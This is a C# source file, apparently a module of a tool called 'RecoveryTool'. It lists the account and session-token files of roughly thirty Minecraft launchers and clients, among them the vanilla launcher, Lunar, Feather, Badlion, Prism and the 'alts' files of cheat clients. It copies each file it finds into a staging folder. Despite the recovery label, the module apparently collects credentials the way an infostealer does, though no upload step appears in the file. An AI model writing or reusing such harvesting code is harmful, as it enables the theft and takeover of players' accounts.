using RecoveryTool.Recovery.Utilities;

namespace RecoveryTool.Recovery.Gaming.Games
{
    public class MinecraftService
    {
        private static readonly Dictionary<string, Dictionary<string, string>> _minecraftPaths;

        static MinecraftService()
        {
            _minecraftPaths = new Dictionary<string, Dictionary<string, string>>
            {
                {
                    "Minecraft", new Dictionary<string, string>
                    {
                        {"Vanilla Profiles", Path.Combine(Common.AppData, ".minecraft", "launcher_profiles.json")},
                        {"Vanilla Accounts", Path.Combine(Common.AppData, ".minecraft", "launcher_accounts.json")},
                        {"Saves", Path.Combine(Common.AppData, ".minecraft", "saves")},
                        {"Logs", Path.Combine(Common.AppData, ".minecraft", "logs")},
                        {"Crash Reports", Path.Combine(Common.AppData, ".minecraft", "crash-reports")},
                        {"Intent", Path.Combine(Common.UserProfile, "intentlauncher", "launcherconfig")},
                        {"Lunar", Path.Combine(Common.UserProfile, ".lunarclient", "settings", "game", "accounts.json")},
                        {"TLauncher", Path.Combine(Common.AppData, ".minecraft", "TlauncherProfiles.json")},
                        {"Feather", Path.Combine(Common.AppData, ".feather", "accounts.json")},
                        {"Meteor", Path.Combine(Common.AppData, ".minecraft", "meteor-client", "accounts.nbt")},
                        {"Impact", Path.Combine(Common.AppData, ".minecraft", "Impact", "alts.json")},
                        {"Novoline", Path.Combine(Common.AppData, ".minecraft", "Novoline", "alts.novo")},
                        {"CheatBreakers", Path.Combine(Common.AppData, ".minecraft", "cheatbreaker_accounts.json")},
                        {"Microsoft Store", Path.Combine(Common.AppData, ".minecraft", "launcher_accounts_microsoft_store.json")},
                        {"Rise", Path.Combine(Common.AppData, ".minecraft", "Rise", "alts.txt")},
                        {"Rise (Intent)", Path.Combine(Common.UserProfile, "intentlauncher", "Rise", "alts.txt")},
                        {"Paladium", Path.Combine(Common.AppData, "paladium-group", "accounts.json")},
                        {"PolyMC", Path.Combine(Common.AppData, "PolyMC", "accounts.json")},
                        {"Badlion", Path.Combine(Common.AppData, "Badlion Client", "accounts.json")},
                        {"Prism", Path.Combine(Common.AppData, "PrismLauncher", "accounts.json")},
                        {"Prism Profiles", Path.Combine(Common.AppData, "PrismLauncher", "profiles.json")},
                        {"GDLauncher", Path.Combine(Common.AppData, "gdlauncher_next", "localStorage.json")},
                        {"ATLauncher", Path.Combine(Common.AppData, ".atlauncher", "accounts.json")},
                        {"Technic", Path.Combine(Common.AppData, ".technic", "launcher_profiles.json")},
                        {"MultiMC", Path.Combine(Common.AppData, "MultiMC", "accounts.json")},
                        {"MultiMC Instances", Path.Combine(Common.AppData, "MultiMC", "instances")},
                        {"CurseForge", Path.Combine(Common.AppData, "curseforge", "minecraft", "Instances")},
                        {"SKLauncher", Path.Combine(Common.AppData, "SKLauncher", "accounts.json")},
                        {"Forge Mods", Path.Combine(Common.AppData, ".minecraft", "mods")}
                    }
                }
            };
        }

        public static async Task SaveMinecraftAsync()
        {
            bool hasFilesOrDirectories = false;

            foreach (var launcher in _minecraftPaths.Keys)
            {
                foreach (var pathName in _minecraftPaths[launcher].Keys)
                {
                    string sourcePath = _minecraftPaths[launcher][pathName];

                    if (Directory.Exists(sourcePath) || File.Exists(sourcePath))
                    {
                        hasFilesOrDirectories = true;
                        break;
                    }
                }
                if (hasFilesOrDirectories) break;
            }

            if (hasFilesOrDirectories)
            {
                var ensureMinecraftPath = Common.EnsureMinecraftPath();

                foreach (var launcher in _minecraftPaths.Keys)
                {
                    foreach (var pathName in _minecraftPaths[launcher].Keys)
                    {
                        string sourcePath = _minecraftPaths[launcher][pathName];

                        if (Directory.Exists(sourcePath))
                        {
                            var destinationPath = Path.Combine(ensureMinecraftPath, pathName);
                            await CopyDirectoryAsync(sourcePath, destinationPath);
                        }
                        else if (File.Exists(sourcePath))
                        {
                            var destinationPath = Path.Combine(ensureMinecraftPath, Path.GetFileName(sourcePath));
                            await CopyFileAsync(sourcePath, destinationPath);
                        }
                    }
                }
            }
        }

        private static async Task CopyFileAsync(string sourcePath, string destinationPath)
        {
            using FileStream sourceStream = new(sourcePath, FileMode.Open, FileAccess.Read, FileShare.Read, 4096, true);
            using FileStream destinationStream = new(destinationPath, FileMode.Create, FileAccess.Write, FileShare.None, 4096, true);
            await sourceStream.CopyToAsync(destinationStream);
        }

        private static async Task CopyDirectoryAsync(string sourceDir, string destinationDir)
        {
            Directory.CreateDirectory(destinationDir);
            foreach (var filePath in Directory.GetFiles(sourceDir))
            {
                string destFilePath = Path.Combine(destinationDir, Path.GetFileName(filePath));
                await CopyFileAsync(filePath, destFilePath);
            }

            foreach (var subDir in Directory.GetDirectories(sourceDir))
            {
                string destSubDir = Path.Combine(destinationDir, Path.GetFileName(subDir));
                await CopyDirectoryAsync(subDir, destSubDir);
            }
        }
    }
}
